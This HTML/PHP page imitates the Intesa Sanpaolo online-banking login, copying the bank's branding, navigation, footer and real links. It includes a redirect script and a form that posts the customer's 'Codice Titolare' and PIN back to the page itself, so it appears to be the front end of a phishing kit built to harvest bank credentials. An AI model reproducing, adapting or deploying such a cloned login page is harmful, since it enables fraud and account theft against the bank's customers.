<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banca San Paolo</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="CSS/style.css">
</head>
<body>
	<?php
        include "redirect/redirect.php";
    ?>
    <div id="panel1">
        <ul class="topnav">
            <li><p class="topLinkText"><a href="https://imi.intesasanpaolo.com/it/" class="topLink">CORPORTE </a></p></li>
            <li><p class="topLinkText"><a href="https://group.intesasanpaolo.com/it/chi-siamo/presenza-internazionale" class="topLink">PRESENZA INTERNAZIONALE </a></p></li>
            <li><p class="topLinkText"><a href="https://group.intesasanpaolo.com/it/" class="topLink">GRUPPO &nbsp;<img src="Img/unionJack.png" alt="Inglese" id="Uk"> </a></p></li>
            <li><p class="topLinkText"><a href="https://group.intesasanpaolo.com/it/careers" class="topLink">CARERS </a></p></li>
            <li><p class="topLinkText"><a href="https://group.intesasanpaolo.com/it/sala-stampa" class="topLink">NEWS </a></p></li>
            <li><p class="topLinkText"><a href="https://www.intesasanpaolo.com/it/common/landing/club-azionisti.html" class="topLink">CLUB AZIONISTI </a></p></li>
            <li><p class="topLinkText"><a href="https://www.finanzainsieme.com/" class="topLink">FINANZIA INSIEME</a></p></li>
        </ul>
    </div>
    <div id="panel2">
        <ul class="topnav2">
            <li class="topLinkImg"><a href="https://www.intesasanpaolo.com/it/persone-e-famiglie.html"><img src="Img/logo-intesasanpaolo.png" alt="logo Intesa Sanpaolo"></a></li>
            <li class="topLink2"><a href="https://www.intesasanpaolo.com/it/persone-e-famiglie.html"><p class="topLinkText2">Persone e Famiglie</p></a></li>
            <li class="topLink2"><a href="https://www.intesasanpaolo.com/it/business.html"><p class="topLinkText2">Business</p></a></li>
            <li class="topLink2"><a href="https://www.intesasanpaolo.com/it/exclusive.html"><p class="topLinkText2">Exclusive</p></a></li>
            <li class="MENU"><a id="search"><i class="fa fa-search" aria-hidden="true"></i></a></li>
            <li style="border-left: 1px solid #fff;" class="MENU"><a href="https://www.intesasanpaolo.com/it/common/parla-con-noi.html"><i class="fa fa-comments-o" aria-hidden="true"></i><br>PARLA<br>CON NOI</a></li>
            <li style="border-left: 1px solid #fff;" class="MENU"><a id="menuOption"><i class="fa fa-bars" aria-hidden="true"></i><br>MENU</a></li>
            <li style="border-left: 1px solid #fff;" class="MENU"><a id="conto" href="https://www.intesasanpaolo.com/it/persone-e-famiglie/prodotti/conti-e-libretti/conto-perme.html"><i class="fa fa-user-plus" aria-hidden="true"></i><br>SCOPRI IL<br>CONTO</a></li>
            <li style="border-left: 1px solid #fff;" class="MENU"><a id="areaPrivata"><i class="fa fa-lock" aria-hidden="true"></i><br>ACCESSO<br>CLIENTI</a></li>
        </ul>
    </div>
    <div style="padding: 50px;background-image: url('Img/background.jpg'); height: 100%; background-position: center; background-repeat: no-repeat; background-size: cover;">
        <br><br><br><br><br>
        <table id="LoginTable">
            <br>
            <tr style="background-color: #ffffff;">
                <td class="mainLogin">
                    <p style="text-align: center;">
                        <img src="Img/utente_ok_green.png">
                        <br>
                        <span style="color: #6f6f6f">
                            <i class="fa fa-lock" aria-hidden="true"></i>
                            ACCEDI ALLA TUA BANCA ONLINE
                        </span>
                    </p>
                    <p>
                        <a href="https://www.intesasanpaolo.com/it/extra-content-login/primo-accesso.html" class="linkMain">Primo accesso?&nbsp&nbsp<i class="fa fa-arrow-right" aria-hidden="true"></i></a>
                        <a href="https://www.intesasanpaolo.com/it/common/landing/anti-phishing.html" class="linkMain">Sicurezza &nbsp<i class="fa fa-arrow-right" aria-hidden="true"></i></a>
                    </p>
                    <br>
                    <form method="POST" action="#">
                        <input onblur="printError()" onselect="deleteError()" oninput="enableButton()" class="input" id="codice" name="codice" placeholder="Codice Titolare" maxlength="8">
                        <br>
                        <p hidden id="erroreCodice">Formato Errato</p>
                        <br>
                        <input onblur="printError()" onselect="deleteError()" oninput="enableButton()" type="password" class="input" id="pin" name="pin" placeholder="PIN" maxlength="5">
                        <br>
                        <p hidden id="errorePin">*Campo obbligatorio: compila per proseguire</p>
                        <br>
                        <a href="https://www.intesasanpaolo.com/"><input type="submit" id="submitDisabled" name="submit" value="ENTRA"></a>
                    </form>
                    <br><br>
                    <p>
                        <a class="linkMain" href="https://www.intesasanpaolo.com/content/vetrina/it/extra-content-login/primo-accesso-privati/recupero-pin.html">Hai dimenticato il PIN? <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
                    </p>
                    <p>
                        <a class="linkMain" href="https://www.intesasanpaolo.com/content/vetrina/it/extra-content-login/primo-accesso-privati/recupero-codice-titolare.html">Hai dimenticato il Codice titolare <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
                    </p>
                </td>
            </tr>
            <tr style="background-color: #2b8804; height:180px;">
                <td id="xmeTd">
                    <p id="text1">Non sei ancora cliente?</p>
                    <p id="text2">Scopri XME Conto, puoi aprirlo anche online.</p>
                    <a href="https://www.intesasanpaolo.com/it/persone-e-famiglie/prodotti/conti-e-libretti/conto-perme.html"><input type="button" id="xme" name="XME" value="APRI XME"></a>
                </td>
            </tr>
            <tr style="background-color: #464646;">
                <td id="prestitoTd">
                    <p id="text1">Sei interessato a un prestito?</p>
                    <p id="text3">Per richiederlo non è necessario essere titolare di un conto corrente Intesa Sanpaolo: ti aspettiamo in filiale.</p>
                </td>
            </tr>
            <tr>
                <td style="color: black; font-size: 12px; text-align: center; margin:auto; background-color: none;">
                    <br>
                    <p>Messaggio Pubblicitario</p>
                </td>
            </tr>
        </table>
    </div>
	<div style="background-color: #464646; height: max-content; padding: 29px 15px;" >
		<span style="color: #ffffff;">SEGUICI ANCHGE SU &nbsp;&nbsp;&nbsp;</span> 
			<a href="https://www.facebook.com/intesasanpaolo/"><img class="social" src="Img/ico-facebook.svg" ant="facebook"></a> 
			<a href="https://www.youtube.com/user/intesasanpaolo?cbrd=1&themeRefresh=1"><img class="social" src="Img/ico-youtube.svg" alt="youtube"></a> 
			<a href="https://x.com/intesasanpaolo"><img class="social" src="Img/ico-twitter.svg" alt="twitter"> </a>
			<a href="https://linkedin.com/company/intesa-sanpaolo/"><img class="social" src="Img/ico-linkedin.svg" alt="linkedin"></a>  
			<a href="https://www.instagram.com/intesasanpaolo/"><img class="social" src="Img/ico-instagram.svg" alt="Instagram"></a> 
		
	</div>
	<div style="background-color: #333333; height: fit-content;">
		<table style="color: #c2c2c2;"  class="uniform-table">
			<tr>
				<td class="infor">
					<i class="fa fa-chevron-circle-right" aria-hidden="true"></i>
					VICINO A TE - ONLINE E IN FILIALE<br>
					<br>
					<a href="https://www.intesasanpaolo.com/it/common/footer/ricerca-filiali.html" class="bottomLink">
						CI TROVI OVUNQUE<br>
						CERCA FILIALI, ATM E PUNTI VENDITA ABILITATI MOONEY
					</a>
				</td>
				<td class="infor">
					<i class="fa fa-chevron-circle-right" aria-hidden="true"></i>
					INFORMAZIONI E SERVIZI<br>
					<br>
					<a href="https://www.intesasanpaolo.com/it/common/footer/guida-ai-servizi.html" class="bottomLink">
						DOMANDE FREQUENTI<br>
						BLOCCA LA TUA CARTA<br>
						DISCONOSCIMENTO<br>
						SCOPRI LA FILIALE DIGITALE<br>
						SICUREZZA<br>
					</a>
				</td>
				<td class="infor">
					<i class="fa fa-chevron-circle-right" aria-hidden="true"></i>
					ASSISTENZA E DOMANDE<br>
					<br>
					<a href="https://www.intesasanpaolo.com/it/common/footer/disconoscimento.html" class="bottomLink">
						GUIDA AI SERVIZI<br>
					</a>
				</td>
				<td class="infor">
					<i class="fa fa-chevron-circle-right" aria-hidden="true"></i>
					RECLAMI E RISOLUZIONE CONTROVERSIE<br>
					<br>
					<a href="https://www.intesasanpaolo.com/it/persone-e-famiglie/reclami.html" class="bottomLink">
						RECLAMI E RISOLUZIONE DELLE CONTROVERSIE<br>
						CONCILIAZIONE PERMANENTE<br>
						ABF<br>
						ACF<br>
						IVASS<br>
						ODR<br>
					</a>
				</td>
			</tr>
			<tr>
				<td class="infor">
					Gruppo Intesa Sanpaolo
					<hr class="linea_divisoria">
					<br>
					<a href="https://group.intesasanpaolo.com/it/governance"  class="bottomLink">
						CHI SIAMO<br>
						INVESTOR RELATIONS<br>
						GOVERNANCE<br>
						SOSTENIBILITÀ<br>
						SOCIALE<br>
						RESEARCH<br>
						NEWSROOM<br>
						CAREERS<br>
					</a>
				</td>
				<td class="infor">
					Banche dei Territori
					<hr class="linea_divisoria">
					<br>
					<a href="https://www.intesasanpaolo.com/it/common/footer/bilanci_e_relazioni.html"  class="bottomLink">
						DATI SOCIETARI<br>
						BILANCI E RELAZIONI<br>
						COMUNICATI STAMPA<br>
						INFORMAZIONI AGLI AZIONISTI E OBBLIGAZIONISTI<br>
						CERTIFICAZIONI E RICONOSCIMENTI<br>
						BANCA PROSSIMA<br>
						SITO PRIVATE<br>
						NOTIZIE<br>
					</a>
				</td>
				<td class="infor">
					Normative
					<hr class="linea_divisoria">
					<br>
					<a href="https://www.intesasanpaolo.com/it/common/footer/decreto-legislativo-231-2001.html" class="bottomLink">
						PRIVACY<br>
						COOKIES<br>
						TRASPARENZA<br>
						D.LGS. 231/2001<br>
						OPERAZIONI DI CESSIONE<br>
						SERVIZI DI INVESTIMENTO<br>
						CARTE: CONVERSIONE VALUTARIA<br>
						RAPPORTI DORMIENTI<br>
					</a>
				</td>
				<td class="infor">
					Accessibilità
					<hr class="linea_divisoria">
					<br>
					<a href="https://group.intesasanpaolo.com/it/dichiarazione-accessibilita/dichiarazione-accessibilita-intesasanpaolo-elencoappios" class="bottomLink">
						DICHIARAZIONE DI ACCESSIBILITÀ<br>
						DICHIARAZIONE DI ACCESSIBILITÀ APP IOS<br>
						MAPPA DEL SITO<br>
					</a>
				</td>
			</tr>
		</table>
		<br>
	</div>
	<div style="background-color: #232323; height: 100px; top: 20px; padding: 20px 20px 40px 20px; color:#D0D0D0; font-size: 11px;">
		<img id="Logo2" src="Img/logo-intesasanpaolo.png" alt="logo IntesaSanPaolo"> <a href="https://www.intesasanpaolo.com/it/common/footer/trasparenza.html"> <img id="info2" src="Img/trasparenza.png" alt="info TRASPARENZA"></a>
		<br>
		Partita IVA 11991500015 (IT11991500015)
		<br>
		<a href="https://www.fondidigaranzia.it/" style="background-color: #232323;">
			<img id="fondo" src="Img/logo-footer.png" alt="FondoGaranzia">
		</a>
	</div>
	<script type="text/javascript"  src="js/script.js"></script>
</body>
</html>
